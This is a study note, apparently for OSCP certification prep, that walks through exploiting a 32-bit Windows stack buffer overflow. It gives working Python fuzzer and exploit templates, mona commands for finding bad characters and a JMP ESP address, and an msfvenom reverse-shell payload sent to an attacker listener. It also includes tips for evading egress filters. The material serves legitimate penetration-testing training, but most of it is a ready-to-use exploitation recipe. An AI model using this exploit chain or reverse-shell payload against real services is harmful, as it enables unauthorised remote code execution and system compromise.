---
tags: [methodology, buffer-overflow, oscp]
---

# 08 — Buffer Overflow (OSCP)

> Back to [[00 - Index (MOC)]]. Classic 32-bit stack overflow (EIP overwrite). Rare on the modern OSCP exam but still in scope and a guaranteed-points skill if it appears. Practice until this is muscle memory (~15 min).

> Related real-world variant: **SEH overflow** (AChat/Chatterbox) — see the lesson in [[07 - Shells & File Transfers]] about reading PoCs and matching the encoder.

## The 6-step ritual

### 1. Spiking / fuzzing — find the vulnerable command
```python
# fuzzer.py — send growing A's until the service crashes
import socket, time
buf = b"A"*100
while True:
    try:
        s=socket.socket(); s.connect((IP,PORT))
        s.recv(1024); s.send(b"COMMAND /.:/" + buf + b"\r\n")
        s.close(); print(len(buf)); buf += b"A"*100; time.sleep(1)
    except: print("Crashed at ~%d"%len(buf)); break
```

### 2. Find the exact offset (EIP control)
```bash
msf-pattern_create -l 3000            # paste into payload
# crash → read EIP value in debugger
msf-pattern_offset -l 3000 -q <EIP>   # → offset, e.g. 2003
```
Confirm: `payload = b"A"*offset + b"B"*4 + b"C"*400` → EIP should read `42424242`.

### 3. Bad characters
Send `\x01..\xff` after EIP, compare memory dump in debugger (mona), remove any that mangle.
```
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bytearray.bin -a <ESP addr>
```
`\x00` is almost always bad. Note the full bad-char string for msfvenom.

### 4. Find a JMP ESP (return address)
```
!mona jmp -r esp -cpb "\x00\x0a"      # module with no ASLR/DEP, no badchars in address
```
Take the address, write it **little-endian** (e.g. `\x83\x04\x08\x62`).

### 5. Generate shellcode (mind the badchars!)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 \
  -b "\x00\x0a\x0d" -f py -v shellcode EXITFUNC=thread
```

### 6. Final exploit
```python
offset   = 2003
eip      = b"\xXX\xXX\xXX\xXX"     # JMP ESP, little-endian
nops     = b"\x90"*16              # NOP sled before shellcode
payload  = b"A"*offset + eip + nops + shellcode
s=socket.socket(); s.connect((IP,PORT)); s.recv(1024)
s.send(b"COMMAND /.:/" + payload + b"\r\n")
```
Start `nc -lvnp 443` first → run → shell.

---

## Checklist / gotchas
- [ ] Restart the vulnerable service between crashes (script it)
- [ ] `\x00` bad char breaks everything — always exclude
- [ ] Return address must have **no badchars** and be in a **non-ASLR** module
- [ ] Little-endian the EIP address
- [ ] NOP sled (`\x90`) between EIP and shellcode gives breathing room
- [ ] LPORT 443/53 to beat egress filters
- [ ] EXITFUNC=thread so the service survives

---

## References
- TCM Security BOF walkthrough (the canonical OSCP prep)
- Justin Steven "dostackbufferoverflowgood"
- thecybermentor / Tib3rius practice binaries
- mona.py: https://github.com/corelan/mona
